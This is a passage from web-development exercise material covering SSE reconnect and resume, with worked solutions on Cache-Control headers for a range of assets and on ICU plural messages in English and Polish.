Server obligations for resume: put a monotonic id: on every event; on a request carrying Last-Event-ID, replay everything after that ID from a retention buffer (or send a snapshot event when the gap is too old); send periodic comment lines (: ping) to defeat proxy idle timeouts, and disable response buffering (e.g. X-Accel-Buffering: no). Abandon EventSource for a fetch() + ReadableStream parser when you must send an Authorization header or need POST bodies (the common LLM-streaming case) — you then re-implement reconnect/resume yourself, which is exactly what EventSource was giving you for free.

Exercise 4 — Cache-Control for a mixed asset inventory

Assign headers to each, with one-line justifications: (a) /assets/app.3f9c2e.js, (b) /index.html, (c) /avatars/u123.jpg (re-uploadable at the same URL), (d) /api/me, (e) /api/products?page=1 (public, changes ~hourly), (f) /fonts/inter-var.woff2 (versioned directory), (g) a CSV export of the user's financial data.

Solution 
(a) Cache-Control: public, max-age=31536000, immutable
    # content-hashed → URL is the version; never revalidate, even on reload
(b) Cache-Control: no-cache            # + ETag
    # store but revalidate every use — the mutable pointer must never be stale;
    # CDN variant: max-age=0, s-maxage=300, stale-while-revalidate=60
(c) Cache-Control: private, max-age=300, stale-while-revalidate=3600  # + ETag
    # mutable URL → short freshness + cheap 304s; 'private' if avatars can be
    # permission-gated. (Better design: hash the URL and make it case (a).)
(d) Cache-Control: private, no-store
    # per-user, sensitive; 'private, max-age=0' + ETag if you want 304 efficiency
(e) Cache-Control: public, s-maxage=600, stale-while-revalidate=300, max-age=60
    # CDN absorbs the traffic and refreshes in background; browsers stay short
(f) Cache-Control: public, max-age=31536000, immutable
    # versioned path = content-addressed in practice; fonts are the classic
    # repeat-download waste. (Add crossorigin handling per font-fetch rules.)
(g) Cache-Control: no-store
    # financial data must never persist in any cache — browser, CDN, or proxy;
    # pair with Content-Disposition: attachment

Meta-lesson to say out loud: the policy follows from two questions — is the URL content-addressed or mutable? and is the response public, per-user, or sensitive? Every row is just those two axes.

Exercise 5 — De-hardcode a string with ICU pluralization

Refactor this to a proper ICU message (react-intl or i18next-ICU), correct for a locale with more than two plural forms, and handle the zero case with better UX than "0 items":

<span>{count} item{count !== 1 && 's'} in your cart, {name}</span>
Solution 
// en.json — ONE complete message; grammar lives with the translator:
{
  "cart.summary": "{count, plural, =0 {Your cart is empty, {name}} one {# item in your cart, {name}} other {# items in your cart, {name}}}"
}

// pl.json — Polish needs few/many; only the translation file changes:
{
  "cart.summary": "{count, plural, =0 {Twój koszyk jest pusty, {name}} one {# przedmiot w koszyku, {name}} few {# przedmioty w koszyku, {name}} many {# przedmiotów w koszyku, {name}} other {# przedmiotu w koszyku, {name}}}"
}

// Component:
<FormattedMessage id="cart.summary" values={{ count, name }} />
// or: intl.formatMessage({ id: 'cart.summary' }, { count, name })

Why each piece matters: =0 is an exact-match override for UX copy ("empty" beats "0 items") and is distinct from the CLDR zero category; one/few/many/other are selected by Intl.PluralRules per locale, so English ships two branches and Polish ships four without any code change; # is the locale-formatted number. The original code was unfixable by translation because the 's' suffix logic — English grammar — was compiled into the component. Bonus checks: the name placeholder stays a placeholder (never concatenate), and pseudo-localization would have flagged this string as hardcoded.
